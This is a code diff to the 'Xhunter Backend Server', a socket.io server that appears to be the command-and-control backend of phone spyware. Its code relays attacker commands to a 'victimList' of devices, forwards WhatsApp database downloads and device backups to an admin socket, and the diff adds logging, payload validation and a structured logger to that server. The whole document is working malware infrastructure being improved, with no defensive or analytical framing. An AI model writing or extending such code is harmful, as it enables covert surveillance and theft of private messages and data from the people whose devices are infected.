@@ -4,6 +4,7 @@ const server = require('http').createServer(app)
 const { Server } = require('socket.io')
 const io = new Server(server, {
   maxHttpBufferSize: 1e8, // 1mb
+  pingTimeout: 60000, // allow admin clients extra time while processing large chunks
 });
 
 var victimList={};
@@ -16,8 +17,14 @@ server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server 
 app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'))
 
 io.on('connection', (socket) => {
+    log(`Socket connected: ${socket.id}`, {
+        address: socket.handshake?.address,
+        userAgent: socket.handshake?.headers?.['user-agent']
+    });
+
     socket.on('adminJoin', ()=>{
         adminSocketId=socket.id;
+        log(`Admin joined => socketId ${socket.id}`);
         if(Object.keys(victimData).length>0){
             Object.keys(victimData).map((key)=>socket.emit("join", victimData[key]));
         }
@@ -54,6 +61,9 @@ io.on('connection', (socket) => {
 
      
       socket.on('disconnect', () => {
+        log(`Socket disconnected: ${socket.id}`, {
+            isAdmin: socket.id === adminSocketId,
+        });
         if(socket.id===adminSocketId){
             adminSocketId=null
         }else{
@@ -69,6 +79,7 @@ io.on('connection', (socket) => {
     
     socket.on("download", (d, callback) =>responseBinary("download", d, callback));
     socket.on("downloadWhatsappDatabase", (d, callback) => {
+        log(`Forwarding downloadWhatsappDatabase payload from ${socket.id}`);
         socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
        });
 
@@ -76,8 +87,22 @@ io.on('connection', (socket) => {
 });
 
 const request =(d)=>{// request from attacker to victim
-    let { to, action, data } = JSON.parse(d);
-    log("Requesting action: "+ action);
+    let payload;
+    try {
+        payload = typeof d === 'string' ? JSON.parse(d) : d;
+    } catch (err) {
+        log.error("Failed to parse request payload", { error: err.message });
+        return;
+    }
+
+    const { to, action, data } = payload;
+
+    if (!to || !victimList[to]) {
+        log.warn(`Request attempted for unknown victim "${to}"`, { action });
+        return;
+    }
+
+    log("Requesting action", { action, to, fromSocket: payload.from });
     io.to(victimList[to]).emit(action, data);
   }
 
@@ -85,6 +110,8 @@ const response =(action, data)=>{// response from victim to attacker
     if(adminSocketId){
         log("response action: "+ action);
         io.to(adminSocketId).emit(action, data);
+    } else {
+        log.warn(`No admin connected to receive response for action "${action}"`);
     }
   }
   
@@ -197,9 +224,39 @@ const handleBackupInitiation = (socket, action, moduleName) => {
         };
         io.to(adminSocketId).emit('backupStatus', backupResponse);
         log(`Backup status sent to admin: ${JSON.stringify(backupResponse)}`);
+    } else {
+        log.warn(`Backup status not sent, no admin connected`, { action, deviceId });
     }
   }
 // LOGGER
-const log = (log) =>{
-    console.log(log)
-  }
+const serializeMeta = (meta) => {
+    if (meta == null) return '';
+    if (typeof meta === 'string') return meta;
+    try {
+        return JSON.stringify(meta);
+    } catch (err) {
+        return `unserializable-meta: ${err.message}`;
+    }
+};
+
+const logBase = (level, message, meta) => {
+    const timestamp = new Date().toISOString();
+    const serializedMeta = serializeMeta(meta);
+    const output = serializedMeta ? `${message} | ${serializedMeta}` : message;
+    const formatted = `[${timestamp}] [${level}] ${output}`;
+
+    if (level === 'ERROR') {
+        console.error(formatted);
+        return;
+    }
+    if (level === 'WARN') {
+        console.warn(formatted);
+        return;
+    }
+    console.log(formatted);
+};
+
+const log = (message, meta) => logBase('INFO', message, meta);
+log.info = log;
+log.warn = (message, meta) => logBase('WARN', message, meta);
+log.error = (message, meta) => logBase('ERROR', message, meta);
